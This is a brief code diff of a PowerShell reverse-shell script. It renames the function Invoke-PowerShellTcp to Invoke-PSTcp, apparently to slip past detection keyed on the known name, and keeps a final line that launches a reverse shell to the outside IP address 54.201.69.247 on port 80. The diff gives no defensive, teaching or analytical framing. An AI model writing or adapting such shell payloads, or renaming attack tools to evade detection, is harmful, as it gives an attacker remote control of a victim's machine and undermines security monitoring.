@@ -1,4 +1,4 @@
-function Invoke-PowerShellTcp 
+function Invoke-PSTcp 
 { 
       
     [CmdletBinding(DefaultParameterSetName="reverse")] Param(
@@ -87,4 +87,4 @@ function Invoke-PowerShellTcp
         Write-Error $_
     }
 }
-Invoke-PowerShellTcp -reverse -IPAddress 54.201.69.247 -Port 80
+Invoke-PSTcp -reverse -IPAddress 54.201.69.247 -Port 80
